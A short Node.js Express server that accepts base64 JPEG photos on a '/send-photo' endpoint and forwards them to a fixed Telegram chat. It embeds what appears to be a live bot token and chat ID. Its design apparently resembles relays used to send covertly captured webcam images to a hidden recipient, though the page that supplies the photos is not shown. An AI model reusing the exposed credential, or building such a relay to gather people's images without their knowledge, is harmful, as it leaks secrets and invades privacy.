const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const app = express();

const BOT_TOKEN = '7881370417:AAEhVIU7kgrfuFsZXFz5PFFK3lRQpvq0G78';
const CHAT_ID = '6596412833';
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

app.use(express.json({ limit: '5mb' })); // Increase limit for large images

app.post('/send-photo', (req, res) => {
    const { photo } = req.body;

    if (photo) {
        const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');

        bot.sendPhoto(CHAT_ID, Buffer.from(base64Data, 'base64'))
            .then(() => res.status(200).send('Photo sent successfully!'))
            .catch(error => res.status(500).send('Error sending photo: ' + error.message));
    } else {
        res.status(400).send('No photo provided!');
    }
});

app.use(express.static(__dirname)); // Serve static files (index.html)

app.listen(3000, () => console.log('Server is running on http://localhost:3000'));